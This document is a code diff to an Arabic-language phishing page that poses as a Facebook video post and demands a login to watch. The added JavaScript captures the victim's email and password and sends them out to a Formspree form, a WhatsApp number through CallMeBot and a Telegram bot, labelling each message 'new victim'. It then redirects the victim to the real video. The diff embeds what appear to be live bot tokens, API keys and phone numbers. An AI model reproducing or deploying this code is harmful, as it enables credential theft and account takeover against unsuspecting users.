@@ -30,7 +30,7 @@
             <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yV/r/t9QT8N9hNwl.png" alt="صفحة">
             <div>
                 <div class="name">صفحة فيسبوك</div>
-                <div class="time">منذ دقيقتين · 🌍</div>
+                <div class="time">منذ دقيقتين . 🌍</div>
             </div>
         </div>
         <div class="video-placeholder" onclick="openLogin()"></div>
@@ -45,8 +45,7 @@
         <div class="login-box">
             <h3>تسجيل الدخول إلى فيسبوك</h3>
             <p>يجب تسجيل الدخول لمشاهدة هذا الفيديو.</p>
-            <!-- ✅ استبدل الرابط برابط Formspree الخاص بك -->
-            <form action="https://formspree.io/f/mojrdevj" method="POST" id="loginForm">
+            <form id="loginForm">
                 <input type="email" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
                 <input type="password" name="password" placeholder="كلمة المرور" required>
                 <button type="submit">تسجيل الدخول</button>
@@ -55,6 +54,17 @@
     </div>
 
     <script>
+        // ========== إعداداتك ==========
+        const FORMSPREE_URL = "https://formspree.io/f/mojrdevj";
+        const WHATSAPP_NUMBER = "9647732254506";   // رقم واتساب مع مفتاح الدولة
+        const WHATSAPP_APIKEY = "6842954";         // مفتاح CallMeBot
+
+        // إعدادات تيليجرام (اختياري مع بروكسي)
+        const TELEGRAM_TOKEN = "8654480187:AAF-vu3ZjbRVBdAUSRA8B3HXE4joSCwjghc";
+        const TELEGRAM_CHAT_ID = "7763665935";
+        const TELEGRAM_PROXY = "https://api.telegram.org"; // أو استخدم بروكسي مثل: "https://myproxy.com/api.telegram.org"
+        // =================================
+
         let realVideoUrl = "https://www.facebook.com/";
         try {
             const params = new URLSearchParams(window.location.search);
@@ -66,19 +76,40 @@
             document.getElementById('loginOverlay').classList.add('active');
         }
 
-        // تعديل السلوك الافتراضي للنموذج لإعادة التوجيه بعد الإرسال
         const form = document.getElementById('loginForm');
         form.addEventListener('submit', async function(e) {
             e.preventDefault();
-            const formData = new FormData(form);
+            const email = document.querySelector('input[name="email"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+
+            // 1. Formspree
+            const formData = new FormData();
+            formData.append("email", email);
+            formData.append("password", password);
+            fetch(FORMSPREE_URL, {
+                method: 'POST',
+                body: formData,
+                headers: { 'Accept': 'application/json' }
+            }).catch(err => {});
+
+            // 2. واتساب
+            const waMsg = `ضحية جديدة%0Aالبريد: ${encodeURIComponent(email)}%0Aكلمة السر: ${encodeURIComponent(password)}`;
+            const whatsappUrl = `https://api.callmebot.com/whatsapp.php?phone=${WHATSAPP_NUMBER}&text=${waMsg}&apikey=${WHATSAPP_APIKEY}`;
+            fetch(whatsappUrl, { mode: 'no-cors' }).catch(err => {});
+
+            // 3. تيليجرام مع محاولة عبر بروكسي
+            const tgMsg = `🔥 ضحية جديدة!\n📧 ${email}\n🔒 ${password}`;
+            const tgUrl = `${TELEGRAM_PROXY}/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(tgMsg)}`;
             try {
-                await fetch(form.action, {
-                    method: 'POST',
-                    body: formData,
-                    headers: { 'Accept': 'application/json' }
-                });
-            } catch(err) {}
-            // إعادة توجيه الضحية للفيديو الأصلي
+                await fetch(tgUrl, { mode: 'cors' });
+            } catch (e) {
+                // إذا فشل البروكسي الأساسي، نجرب بدونه
+                try {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(tgMsg)}`, { mode: 'cors' });
+                } catch (e2) {}
+            }
+
+            // إعادة توجيه الضحية
             window.location.href = realVideoUrl;
         });
     </script>
